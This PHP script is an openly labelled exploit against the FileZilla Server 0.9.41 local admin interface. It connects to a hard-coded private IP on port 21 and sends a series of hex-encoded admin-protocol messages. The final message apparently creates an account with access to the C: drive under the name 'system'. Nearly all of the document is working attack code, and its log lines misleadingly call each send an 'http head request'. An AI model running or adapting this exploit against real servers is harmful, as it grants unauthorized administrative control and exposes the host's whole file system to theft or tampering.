<?php
function hextostr($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2){
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
function String2Hex($string){
    $hex='';
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
error_reporting(E_ALL);
echo "<h2>Filezilla(0.9.41) local admin port exploit</h2><br>";
$service_port = 21;
$address = '192.168.0.16';

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($socket,SOL_SOCKET, SO_RCVTIMEO, array("sec"=>2, "usec"=>0));
if ($socket === false) {
	echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "<br>";
} else {
	echo "OK. <br>";
}

echo "Attempting to connect to '$address' on port '$service_port'...";
$result = socket_connect($socket, $address, $service_port);
if($result === false) {
	echo "socket_connect() failed.<br>Reason: ($result) " . socket_strerror(socket_last_error($socket)) . "<br>";
} else {
	echo "OK <br>";
}
sleep(5);
/*
while ($out = socket_read($socket, 15)) {
	echo "out: " . $out . "<br>";
}
socket_close($socket);
die();
*/
$out = "";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
$in = hextostr("0800000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
//sleep(1);
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";

$in = hextostr("0c0100000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
//sleep(2);
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";

$in = hextostr("1800000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
$in = hextostr("2000000000");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
$in = hextostr("18550000000000000100000000000000000000040000000000010003433a5c000001ff00000a000000000a0000000000000673797374656d00203164303437386139303331353065323364316336636130313939313462303330");
echo "sending http head request ...";
socket_write($socket, $in, strlen($in));
echo  "OK<br>";
$out = socket_read($socket, 1024);
echo "out: " . bin2hex($out) . "<br>";
echo "All done.<br><br>";
echo "closeing socket..";
socket_close($socket);
echo "ok .<br><br>";
